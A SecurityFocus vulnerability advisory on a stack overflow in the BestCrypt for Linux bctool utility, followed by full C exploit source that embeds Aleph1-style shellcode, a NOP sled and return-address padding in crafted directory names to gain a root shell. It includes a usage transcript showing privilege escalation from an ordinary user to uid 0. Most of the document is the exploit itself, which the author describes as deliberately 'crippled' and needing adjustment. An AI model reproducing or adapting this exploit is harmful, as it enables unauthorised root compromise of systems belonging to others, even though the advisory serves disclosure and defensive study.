source: http://www.securityfocus.com/bid/2875/info

BestCrypt is a commercial file system encryption software package distributed by Jetico. BestCrypt offers compatibility on the Windows and Linux platforms, using open development standards to offer a secure product.

A problem with BestCrypt makes it possible for a local user to gain elevated privileges. Due to insufficient checking of bounds by the program bctool when unmounting an encrypted file system, it's possible to overflow a buffer within the program, overwriting variables on the stack. This could lead to execution of code as root.

This problem makes it possible for a local user to gain elevated privileges. Successful exploitation of this vulnerability leads to root compromise. 

/*
 * Crippled version of the BestCrypt for Linux r00t exploit.
 * Note: this will not work out-of-the-box. You'll need to adjust it.
 * Script kiddies: don't even think about it.
 *
 * By Carl Livitt (carl@ititc.com)
 *
 * Usage example:

        foo:~ > id
        uid=500(carl) gid=100(users) groups=100(users)
        foo:~ > gcc -o bcexp bcexp.c
        foo:~ > ./bcexp
        foo:~ > bctool mount /path/to/container.jbc "$EGG"
        Enter password:
        foo:~ > bctool umount "$EGG"
        sh-2.04# id
        uid=0(root) gid=0(root) groups=0(root),1(bin),14(uucp),15(shadow)
        sh-2.04#

 * RET value will need tinkered with, also you'll find that you need to examine
 * the call history quite closely to make this work ;-)  Have a look, you'll see
 * what I mean!
 *
 * You'll also notice there's a fair bit of redundant/messy/debug code in here...
 * This is intended to be an exploit, not an example of good coding.
 *
 */
#include <stdio.h>

// Chopped up Aleph1 linux shellcode to work in a directory path.
char shellcode[]="\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89\x76\x08\xb0"
                 "\x0b\x87\xf3\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0\x40\xcd"
                 "\x80\xe8\xde\xff\xff\xff";

char shellpath[] = "/bin";
char shellprog[] = "/sh";

// not used any longer
unsigned long sp() { __asm__("movl %esp, %eax"); }

main(int argc, char **argv) {
        char *p,*p2, path[4096], shell[4096], command[4096], old[4096];
        int i,len, offs;
        unsigned long addr=0xbffff410;

        if(argc>1) {
                offs=atoi(argv[1]);
        } else {
                offs=0;
        }
        chdir("/tmp");
        addr+=offs;
        printf("Using addr = 0x%08x\n", addr);

        // build a series of NOPs + shellcode and  make directory
        p=path;
        for(i=0;i<162-strlen(shellcode);i++)
                *(p++)=(char)0x90;
        p2=shellcode;
        for(i=0;i<strlen(shellcode);i++)
                *(p++)=*(p2++);
        *p=0;
        strcpy(old, path);
        sprintf(command,"mkdir \"%s\"", path);
        system(command);

        // add the path to the shell to the shellcode-cum-path
        for(i=0;i<strlen(shellpath);i++)
                *(p++)=shellpath[i];
        *p=0;
        sprintf(command,"mkdir \"%s\"", path);
        system(command);

        // add the name of the shell to the shellcode-cum-path
        for(i=0;i<strlen(shellprog);i++)
                *(p++)=shellprog[i];
        *p=0;
        printf("strlen(path)=%d\n", strlen(path));
        sprintf(command,"mkdir \"%s\"", path);
        system(command);

        // pad out the buffer with our RET address
        for(i=0;i<172;i++)
        {
                *(p++)=(char)(addr>>16)&0xff;
                *(p++)=(char)(addr>>24)&0xff;
                *(p++)=(char)addr&0xff;
                *(p++)=(char)(addr>>8)&0xff;
        }
        addr=(unsigned long)*(p-4);
        printf("ADDRESS: 0x%x\n", addr);
        *p=0;
        printf("strlen(path)=%d\n", strlen(path));
        sprintf(command,"mkdir \"%s\"", path);
        system(command);

        // set environment variable and spawn a fresh shell
        setenv("EGG",path,1);
        system("/bin/bash");
}